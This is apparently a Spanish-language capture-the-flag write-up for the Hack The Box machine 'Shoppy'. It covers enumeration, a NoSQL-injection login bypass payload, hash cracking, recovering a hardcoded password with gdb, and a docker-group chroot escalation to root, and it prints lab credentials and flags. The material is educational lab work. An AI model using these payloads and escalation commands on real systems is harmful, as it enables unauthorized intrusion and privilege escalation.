---
tags:
title: Shoppy - Easy (HTB)
toc: true
toc_label: Topics
permalink: /Shoppy-HTB-Writeup
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,80,9093 10.129.227.233
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 11:42 -0500
Nmap scan report for shoppy.htb (10.129.227.233)
Host is up (0.57s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http    nginx 1.23.1
|_http-title:             Shoppy Wait Page        
|_http-server-header: nginx/1.23.1
9093/tcp open  http    Golang net/http server
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Mon, 29 Dec 2025 16:45:34 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 3
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 3
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 9.177e-06
|     go_gc_duration_seconds{quantile="0.25"} 9.177e-06
|     go_gc_durat
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Mon, 29 Dec 2025 16:45:36 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 3
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 3
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 9.177e-06
|     go_gc_duration_seconds{quantile="0.25"} 9.177e-06
|_    go_gc_durat
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.98%I=7%D=12/29%Time=6952AF92%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2F44,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Mon,\x
SF:2029\x20Dec\x202025\x2016:45:34\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles
SF:_automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\
SF:x20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles
SF:_automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles
SF:_total\x203\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count\
SF:x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicatio
SF:n\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_gc
SF:_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_gc
SF:_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\x
SF:20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_t
SF:otal_gc_cycles_total\x203\n#\x20HELP\x20go_gc_duration_seconds\x20A\x20
SF:summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collectio
SF:n\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc_du
SF:ration_seconds{quantile=\"0\"}\x209\.177e-06\ngo_gc_duration_seconds{qu
SF:antile=\"0\.25\"}\x209\.177e-06\ngo_gc_durat")%r(HTTPOptions,2A0E,"HTTP
SF:/1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\
SF:x20charset=utf-8\r\nDate:\x20Mon,\x2029\x20Dec\x202025\x2016:45:36\x20G
SF:MT\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\
SF:x20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20r
SF:untime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counte
SF:r\ngo_gc_cycles_automatic_gc_cycles_total\x203\n#\x20HELP\x20go_gc_cycl
SF:es_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_force
SF:d_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200\
SF:n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all\
SF:x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cycl
SF:es_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x203\n#\x20HELP
SF:\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20dur
SF:ation\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc_du
SF:ration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x209\
SF:.177e-06\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x209\.177e-06\ngo_
SF:gc_durat");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.41 seconds

```

## Website 

La pagina principal es estatica sin nada de contenido.

![image-center](/assets/images/Pasted image 20251229151013.png)

## Gobuster

La enumeracion con `gobuster` me mostro que hay un panel de login.

```bash
gobuster dir -t 200 -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt 
<SNIP>
/login                (Status: 200) [Size: 1074]
/images               (Status: 301) [Size: 179] [--> /images/]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
Progress: 27896 / 207642 (13.43%)^C
```

### Login

![image-center](/assets/images/Pasted image 20251229135350.png)
### NoSQL Injection

Probé miles de cosas para `bypassear` el panel de login, como Inyecciones SQL, ya que vi que colocando una comilla `'` me daba el siguiente error.

![image-center](/assets/images/Pasted image 20251229151329.png)

Por lo q perdí tiempo hasta que di con una Inyección `NoSQL` la cual aplica para bases de datos de `MongoDB`. Use de prueba inyecciones del la pagina de [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html?highlight=nosql#nosql-injection), usando el siguiente `payload`.

```sql
`admin' || 'a'=='a`
```

Que como dice en la propia pagina.

>Un atacante puede explotar esto introduciendo cadenas como `admin' || 'a' == 'a`, haciendo que la consulta devuelva todos los documentos satisfaciendo la condición con una tautología `('a' == 'a')`

Lo que me dio acceso al panel de administrador en la pagina.

![image-center](/assets/images/Pasted image 20251229141858.png)
## Mattermost as josh

Dentro del mismo puedo buscar por usuarios, así que busque por `admin`.

![image-center](/assets/images/Pasted image 20251229142008.png)
### Leak password
Y clickeando el el botón de `Download export` me mostro lo siguiente.

![image-center](/assets/images/Pasted image 20251229142411.png)

El hash es `incrackeable`, por lo que use la misma inyección la cual me mostro el hash y los datos de el usuario `josh.

![image-center](/assets/images/Pasted image 20251229142742.png)

![image-center](/assets/images/Pasted image 20251229142728.png)
## Shell as jaeger

Lo crackee lo que me dio como password: `rememberthisway`.

![image-center](/assets/images/Pasted image 20251229142540.png)
### Subdomain enumeration

Debido a que las credenciales no aplicaban para esta pagina me decidí en buscar por subdominios.

```bash
gobuster vhost -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 200 --append-domain                 
<SNIP>
mattermost.shoppy.htb Status: 200 [Size: 3122]
Progress: 49550 / 100000 (49.55%)
```
### Auth 

Lo agregue al `/etc/hosts`, y me loguee con las credenciales de `josh`.

![image-center](/assets/images/Pasted image 20251229142926.png)

Dentro de uno de los canales veo credenciales para el usuario `jaeger`.

![image-center](/assets/images/Pasted image 20251229143020.png)

Las mismas son validas para la conexión por `ssh`.

```bash
 ssh jaeger@shoppy.htb 
<SNIP>
jaeger@shoppy:~$ cat user.txt 
e3b962bc3c49ae5fd57286201aef1eed
```
## Shell as deploy

### SUDO binary

Viendo los permisos a nivel de `suoders` veo que puedo ejecutar como el usuario `deploy` el siguiente binario.

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: ^C

```

Veo que es un ejecutable de `64` bits.

```bash
jaeger@shoppy:/home/deploy$ file password-manager
password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped

```
### Reverse engineering

Lo traje a mi maquina para analizarlo con `ltrace`. Donde pongo como input `test` y veo que se compara con `_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4_` que es hacia donde se realizan varias llamadas.

```bash
ltrace ./password-manager  
_ZNSt8ios_base4InitC1Ev(0x55ec215732f9, 0xffff, 0x7ffd91a23bb8, 96)                                                 = 2
__cxa_atexit(0x7f7ed62cc3d0, 0x55ec215732f9, 0x55ec21573090, 96)                                                    = 0
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55ec215730c0, 0x55ec21571010, 0x7ffd91a23bb8, 128)        = 0x55ec215730c0
_ZNSolsEPFRSoS_E(0x55ec215730c0, 0x7f7ed6346410, 0x55ec215730c0, 0x7f7ed6017790Welcome to Josh password manager!
)                                    = 0x55ec215730c0
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55ec215730c0, 0x55ec21571038, 0x55ec215730c8, 0)          = 0x55ec215730c0
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffd91a23a50, 0x55ec21571038, 0x7f7ed646c2f0, 0x7f7ed6017790) = 0x7ffd91a23a60
_ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE(0x55ec215731e0, 0x7ffd91a23a50, 0x7f7ed646c2f0, 0x7f7ed6017790Please enter your master password: test
) = 0x55ec215731e0
_ZNSaIcEC1Ev(0x7ffd91a23a7f, 4, 0x55ec215731f0, 15)                                                                 = 0x7ffd91a23a7f
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_(0x7ffd91a23a30, 0x55ec2157105c, 0x7ffd91a23a7f, 15) = 0
_ZNSaIcED1Ev(0x7ffd91a23a7f, 0x55ec2157105c, 0, 0)                                                                  = 0x7ffd91a23a7f
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffd91a23a30, 0x55ec2157105d, 0, 0)                   = 0x7ffd91a23a30
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffd91a23a30, 0x55ec2157105f, 1, 0x55ec2157105d)      = 0x7ffd91a23a30
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffd91a23a30, 0x55ec21571061, 1, 0x55ec2157105f)      = 0x7ffd91a23a30
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffd91a23a30, 0x55ec21571063, 1, 0x55ec21571061)      = 0x7ffd91a23a30
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffd91a23a30, 0x55ec21571065, 1, 0x55ec21571063)      = 0x7ffd91a23a30
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffd91a23a30, 0x55ec21571067, 1, 0x55ec21571065)      = 0x7ffd91a23a30
_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4_(0x7ffd91a23a50, 0x7ffd91a23a30, 0x7ffd91a23a30, 0x55ec21571067) = 33
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55ec215730c0, 0x55ec215710b0, 1, 83)                      = 0x55ec215730c0
_ZNSolsEPFRSoS_E(0x55ec215730c0, 0x7f7ed6346410, 0x55ec215730c0, 0x7f7ed6017790Access denied! This incident will be reported !
)                                    = 0x55ec215730c0
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x7ffd91a23a30, 0x55ec21ffc320, 0x55ec215730c8, 0)        = 0x7ffd91a23a40
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev(0x7ffd91a23a50, 0x55ec21ffc320, 0x55ec215730c8, 0)        = 0x7ffd91a23a60
+++ exited (status 1) +++
```

### Recover password

Así que corrí el binario en `gdb` pero coloque un `breakpoint` en `_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4_`.

```bash
gdb ./password-manager   
<SNIP>
(gdb) break _ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4_
quit
Breakpoint 1 at 0x1030
(gdb) r
Starting program: /home/zs1n/Desktop/htb/shoppy/password-manager 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to Josh password manager!
Please enter your master password: test

Breakpoint 1, 0x00007ffff7d59fb0 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::compare(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) const () from /usr/lib/x86_64-linux-gnu/libstdc++.so.6
<SNIP>
```

Y luego con el comando `x/s` : 

Donde `x` es para examinar y `s` es para mostrar en formato `string` lo que le pida.
### Password

Por lo que quiero que en 32 bytes de hex quiero que me muestre las llamadas. `$rdi` que en assembler es donde se almacena mi `input` y en `$rsi` donde se almacena lo que hay en esa dirección.

```dasd
(gdb) x/s32xb $rsi
Invalid number "32xb".
(gdb) x/32xb $rsi
0x7fffffffe070: 0x80    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe078: 0x06    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe080: 0x53    0x61    0x6d    0x70    0x6c    0x65    0x00    0x00 <-------- Sample
0x7fffffffe088: 0x88    0x1e    0xe7    0xf7    0xff    0x7f    0x00    0x00
(gdb) x/32xb $rdi
0x7fffffffe090: 0xa0    0xe0    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe098: 0x04    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe0a0: 0x74    0x65    0x73    0x74    0x00    0x00    0x00    0x00 <-------- test
0x7fffffffe0a8: 0xe8    0xe1    0xff    0xff    0xff    0x7f    0x00    0x00

```

Decodificándolo es `Sample` que al parecer es la cadena con la que se compara mi input.

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!

```

Ahora que tengo la pass de `deploy`.

```bash
jaeger@shoppy:/home/deploy$ su deploy
Password: 
```
### Bad permissions

Y veo que estoy en el grupo `docker`.

```bash
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```
## Shell

Por lo que siguiendo los pasos de la pagina de [GTFObins](https://gtfobins.github.io/gtfobins/docker/#shell) monto un contenedor con la raíz del sistema pero como `root`

```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
# cat /root/root.txt
07308429a51d173f80236bdafa98f621
```

`~Happy Hacking.`